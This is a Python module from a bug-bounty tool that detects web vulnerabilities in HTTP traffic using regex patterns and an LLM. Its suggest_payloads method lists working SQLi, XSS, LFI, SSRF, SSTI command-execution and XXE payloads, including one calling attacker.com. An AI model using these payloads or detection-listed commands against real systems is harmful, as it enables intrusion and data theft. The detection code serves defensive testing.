# ============================================================================
# Sentinel Pro v3.0 — Professional OSINT & Bug Bounty Platform
# Copyright (c) 2026 @who_is_the_black_hat. All rights reserved.
#
# Unauthorized copying, distribution, or modification of this software,
# via any medium, is strictly prohibited without written permission.
#
# Licensed users may use this software under the terms of their license.
# For licensing: https://github.com/Mrsultan7890/osints
# ============================================================================

"""
AI Analyzer — SentinelNet + Groq request analysis
===================================================
Analyzes HTTP requests/responses for vulnerabilities.
Uses existing trained models + Groq for deep analysis.
"""

import re
import json
import logging
import threading

logger = logging.getLogger(__name__)

# Payload patterns from training data
VULN_PATTERNS = {
    'SQLi': [
        r"'.*?(OR|AND|UNION|SELECT|INSERT|DROP|UPDATE|DELETE|FROM|WHERE)",
        r"(--|#|/\*|\*/)",
        r"(SLEEP|BENCHMARK|WAITFOR|pg_sleep)\s*\(",
        r"(1=1|1=2|'='|\"=\")",
        r"(CHAR|CONCAT|GROUP_CONCAT|SUBSTRING)\s*\(",
    ],
    'XSS': [
        r"<script[^>]*>",
        r"javascript\s*:",
        r"on(load|error|click|mouseover|focus|blur|change|submit)\s*=",
        r"<(img|svg|iframe|object|embed|link)[^>]*(src|href|data)\s*=",
        r"(alert|confirm|prompt|eval|document\.cookie|window\.location)\s*\(",
    ],
    'LFI': [
        r"\.\./",
        r"(etc/passwd|etc/shadow|windows/win\.ini|boot\.ini)",
        r"(php://|file://|data://|expect://|zip://)",
        r"(include|require|include_once|require_once)\s*\(",
    ],
    'SSRF': [
        r"(http|https|ftp|file|dict|gopher)://(?:localhost|127\.0\.0\.1|0\.0\.0\.0|169\.254\.169\.254|\[::1\])",
        r"(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)",
        r"(metadata\.google|169\.254\.169\.254/latest)",
    ],
    'SSTI': [
        r"\{\{.*?\}\}",
        r"\{%.*?%\}",
        r"\$\{.*?\}",
        r"(7\*7|7\*'7')",
    ],
    'RCE': [
        r"(;|\||&&|`|\$\()\s*(ls|cat|id|whoami|uname|pwd|wget|curl|bash|sh|python|perl|ruby)",
        r"(system|exec|shell_exec|passthru|popen|proc_open)\s*\(",
        r"(__import__|subprocess|os\.system|os\.popen)",
    ],
    'XXE': [
        r"<!ENTITY",
        r"SYSTEM\s+['\"]",
        r"<!DOCTYPE[^>]*\[",
    ],
    'Path Traversal': [
        r'(\.\./){2,}',
        r'(\.\./|\.\.\\/|%2e%2e%2f|%2e%2e/|\.\./){1,}',
        r'%2e%2e%2f',
        r'\.\.\\\'',
        r'(\.{2,}/){1,}',
    ],
    'Open Redirect': [
        r"(redirect|return|next|url|goto|target|redir|destination)\s*=\s*https?://",
    ],
}

SEV_MAP = {
    'SQLi': 'CRITICAL', 'RCE': 'CRITICAL', 'SSTI': 'CRITICAL',
    'XXE': 'CRITICAL', 'LFI': 'HIGH', 'SSRF': 'HIGH',
    'XSS': 'HIGH', 'Path Traversal': 'HIGH', 'Open Redirect': 'MEDIUM',
}


class AIAnalyzer:
    """
    Analyzes HTTP flows for vulnerabilities.
    Fast pattern matching + SentinelNet + Groq (async) + BehavioralEngine (AI attack detection).
    """

    VULN_PATTERNS = VULN_PATTERNS  # expose as class attribute

    def __init__(self):
        self._sentinel = self._load_sentinel()
        self._lock      = threading.Lock()
        # Groq singleton — proxy mein deep vuln analysis ke liye
        try:
            import sys as _sys
            if '/home/kali/osints' not in _sys.path:
                _sys.path.insert(0, '/home/kali/osints')
            from modules.ml_engine.groq_llm import get_groq
            self._groq = get_groq()
        except Exception:
            self._groq = None
        
        # Behavioral Intelligence Engine — AI attack detection
        self._behavioral = self._load_behavioral()
    
    def _load_behavioral(self):
        try:
            import sys
            if '/home/kali/osints' not in sys.path:
                sys.path.insert(0, '/home/kali/osints')
            from sentinel_brain.engines import BehavioralEngine
            logger.info("[AIAnalyzer] BehavioralEngine loaded")
            return BehavioralEngine()
        except Exception as e:
            logger.debug(f"BehavioralEngine load: {e}")
        return None

    def _load_sentinel(self):
        try:
            import sys
            sys.path.insert(0, '/home/kali/osints')
            from modules.ml_engine.sentinel_net import NeuralTrainer
            nt = NeuralTrainer()
            if nt.load():
                logger.info("[AIAnalyzer] SentinelNet loaded")
                return nt
        except Exception as e:
            logger.debug(f"SentinelNet load: {e}")
        return None

    def _load_groq(self):
        """Legacy — use get_groq() singleton instead."""
        try:
            import sys
            sys.path.insert(0, '/home/kali/osints')
            from modules.ml_engine.groq_llm import get_groq
            return get_groq()
        except Exception as e:
            logger.debug(f"Groq load: {e}")
        return None

    # ── Main Analysis ─────────────────────────────────────────────────────────

    def analyze(self, flow: dict) -> dict:
        """
        Fast sync analysis — pattern matching + SentinelNet + BehavioralEngine.
        Returns: {risk, vulns, summary, params_flagged, ai_attack}
        """
        result = {
            'risk':           'LOW',
            'vulns':          [],
            'summary':        '',
            'params_flagged': [],
            'confidence':     0.0,
            'ai_attack':      False,
            'ai_confidence':  0.0,
            'ai_reason':      '',
        }
        
        # Behavioral analysis for AI attack detection
        if self._behavioral:
            try:
                request_data = {
                    'method': flow.get('method', 'GET'),
                    'url': flow.get('url', ''),
                    'status_code': flow.get('status_code', 200),
                    'response_time': flow.get('response_time', 0),
                    'request_size': len(flow.get('body', '')),
                    'response_size': len(flow.get('resp_body', '')),
                    'headers': flow.get('headers', {}),
                    'user_agent': flow.get('headers', {}).get('User-Agent', ''),
                    'ip_address': flow.get('client_ip', 'unknown'),
                    'session_id': flow.get('session_id', flow.get('client_ip', 'unknown')),
                }
                is_ai, ai_conf, ai_reason = self._behavioral.analyze_request(request_data)
                result['ai_attack'] = is_ai
                result['ai_confidence'] = ai_conf
                result['ai_reason'] = ai_reason
                
                if is_ai:
                    result['vulns'].append({
                        'type': 'AI Attack',
                        'severity': 'CRITICAL',
                        'detail': f'AI-powered attack detected: {ai_reason}',
                    })
                    result['risk'] = 'CRITICAL'
            except Exception as e:
                logger.debug(f'Behavioral analysis error: {e}')

        # Build text to analyze
        text_parts = [
            flow.get('url', ''),
            flow.get('body', ''),
            json.dumps(flow.get('params', {})),
            flow.get('resp_body', '')[:2000],
        ]
        full_text = ' '.join(text_parts)

        # 1. Pattern matching (fast)
        vulns = self._pattern_scan(full_text, flow)
        result['vulns'] = vulns

        # 2. SentinelNet classification
        if self._sentinel and full_text.strip():
            try:
                pred = self._sentinel.predict(full_text[:1000])
                result['confidence'] = pred.get('confidence', 0)
                ml_risk = pred.get('label', 'LOW')
                if ml_risk in ('CRITICAL', 'HIGH'):
                    if not vulns:
                        result['vulns'].append({
                            'type': pred.get('threat_type', 'unknown'),
                            'severity': ml_risk,
                            'detail': f"SentinelNet: {pred.get('action_hint','')}",
                        })
            except Exception:
                pass

        # 3. Overall risk
        if vulns:
            sevs = [SEV_MAP.get(v['type'], 'MEDIUM') for v in vulns]
            if 'CRITICAL' in sevs: result['risk'] = 'CRITICAL'
            elif 'HIGH' in sevs:   result['risk'] = 'HIGH'
            else:                  result['risk'] = 'MEDIUM'

        # 4. Summary
        if vulns:
            types = list(set(v['type'] for v in vulns))
            result['summary'] = f"⚠️ {', '.join(types)} detected in {flow.get('method','')} {flow.get('path','')}"
        else:
            result['summary'] = f"✓ {flow.get('method','')} {flow.get('path','')} — clean"

        return result

    def analyze_deep(self, flow: dict, callback=None):
        """
        Deep async Groq analysis — runs in background thread.
        callback(groq_result) called when done.
        """
        if not self._groq:
            if callback:
                callback({'risk': 'UNKNOWN', 'vulns': [], 'detail': 'Groq not configured', 'fix': ''})
            return

        def _run():
            try:
                url    = flow.get('url', '')
                method = flow.get('method', '')
                status = flow.get('status_code', '')

                # params/body may be JSON string (from DB) or dict
                raw_params = flow.get('params', {})
                if isinstance(raw_params, str):
                    try:
                        raw_params = json.loads(raw_params)
                    except Exception:
                        raw_params = {}
                params = json.dumps(raw_params)[:300]

                body = (flow.get('body') or '')[:500]
                resp = (flow.get('resp_body') or '')[:300]

                prompt = (
                    f"Analyze this HTTP request for security vulnerabilities:\n"
                    f"Method: {method}\nURL: {url}\n"
                    f"Params: {params}\nBody: {body}\n"
                    f"Response: {status} {resp}\n\n"
                    f"Reply ONLY in JSON: {{\"risk\": \"LOW/MEDIUM/HIGH/CRITICAL\", "
                    f"\"vulns\": [\"vuln1\", ...], \"detail\": \"explanation\", "
                    f"\"fix\": \"recommendation\"}}"
                )
                out = self._groq.ask(prompt, max_tokens=250)
                if callback:
                    if out:
                        try:
                            m = re.search(r'\{.*\}', out, re.DOTALL)
                            callback(json.loads(m.group()) if m else {'detail': out[:200]})
                        except Exception:
                            callback({'detail': out[:200]})
                    else:
                        callback({'risk': 'UNKNOWN', 'vulns': [], 'detail': 'No response', 'fix': ''})
            except Exception as e:
                logger.debug(f'Groq analysis error: {e}')
                if callback:
                    callback({'risk': 'UNKNOWN', 'vulns': [], 'detail': str(e), 'fix': ''})

        threading.Thread(target=_run, daemon=True, name='sp-groq').start()

    # ── Pattern Scanner ───────────────────────────────────────────────────────

    def _pattern_scan(self, text: str, flow: dict) -> list:
        vulns = []
        detected_types = set()

        # Priority order — specific types pehle check karo
        PRIORITY_ORDER = ['XXE', 'SSTI', 'RCE', 'SQLi', 'XSS', 'LFI',
                          'Path Traversal', 'Open Redirect', 'SSRF']
        ordered = PRIORITY_ORDER + [t for t in VULN_PATTERNS if t not in PRIORITY_ORDER]

        # XXE — body mein specifically check karo
        body = flow.get('body', '')
        if body and re.search(r'<!ENTITY|<!DOCTYPE.*\[', body, re.IGNORECASE | re.DOTALL):
            vulns.append({
                'type': 'XXE', 'severity': 'CRITICAL',
                'pattern': '<!ENTITY', 'param': 'body',
                'detail': 'XXE pattern in request body',
            })
            detected_types.add('XXE')

        # Open Redirect — params mein specifically check karo
        params = flow.get('params', {})
        OR_PARAMS = {'redirect', 'return', 'next', 'url', 'goto', 'target',
                     'redir', 'destination', 'back', 'continue', 'forward'}
        for k, v in params.items():
            if k.lower() in OR_PARAMS and re.match(r'https?://', str(v)):
                # Check it's not an internal IP (that would be SSRF)
                if not re.search(r'(127\.0\.0\.1|localhost|0\.0\.0\.0|169\.254|192\.168|10\.|172\.)', str(v)):
                    vulns.append({
                        'type': 'Open Redirect', 'severity': 'MEDIUM',
                        'pattern': 'redirect param', 'param': k,
                        'detail': f'Open Redirect in param: {k}',
                    })
                    detected_types.add('Open Redirect')
                    break

        for vuln_type in ordered:
            if vuln_type in detected_types:
                continue
            if vuln_type in ('XXE', 'Open Redirect'):
                continue
            patterns = VULN_PATTERNS.get(vuln_type, [])
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    flagged_param = self._find_flagged_param(
                        flow.get('params', {}),
                        flow.get('body', ''),
                        pattern
                    )
                    vulns.append({
                        'type':     vuln_type,
                        'severity': SEV_MAP.get(vuln_type, 'MEDIUM'),
                        'pattern':  pattern[:50],
                        'param':    flagged_param,
                        'detail':   f"{vuln_type} pattern in {flagged_param or 'request'}",
                    })
                    detected_types.add(vuln_type)
                    break

        return vulns

    def _find_flagged_param(self, params: dict, body: str, pattern: str) -> str:
        for k, v in params.items():
            if re.search(pattern, str(v), re.IGNORECASE):
                return k
        # Check body params
        for part in body.split('&'):
            if '=' in part:
                k, _, v = part.partition('=')
                if re.search(pattern, v, re.IGNORECASE):
                    return k
        return ''

    # ── Payload Suggester ─────────────────────────────────────────────────────

    def suggest_payloads(self, vuln_type: str, param: str = '') -> list:
        """Return payloads for a given vuln type."""
        PAYLOADS = {
            'SQLi': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "1; DROP TABLE users--",
                "' AND SLEEP(5)--",
                "1' ORDER BY 1--",
                "' AND 1=CONVERT(int,@@version)--",
                "admin'--",
            ],
            'XSS': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(document.cookie)",
                "<svg onload=alert(1)>",
                "'><script>alert(1)</script>",
                "<body onload=alert(1)>",
                "{{7*7}}",
                "<iframe src=javascript:alert(1)>",
            ],
            'LFI': [
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=index.php",
                "../../windows/win.ini",
                "../../../proc/self/environ",
            ],
            'SSRF': [
                "http://127.0.0.1/",
                "http://localhost/admin",
                "http://169.254.169.254/latest/meta-data/",
                "http://0.0.0.0:22/",
                "dict://127.0.0.1:6379/",
                "file:///etc/passwd",
            ],
            'SSTI': [
                "{{7*7}}",
                "${7*7}",
                "{{config}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{% for x in ().__class__.__base__.__subclasses__() %}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            ],
            'RCE': [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
            ],
            'XXE': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
            ],
            'Open Redirect': [
                "https://evil.com",
                "//evil.com",
                "/\\evil.com",
                "https://evil.com%2F@legitimate.com",
            ],
        }
        return PAYLOADS.get(vuln_type, [])
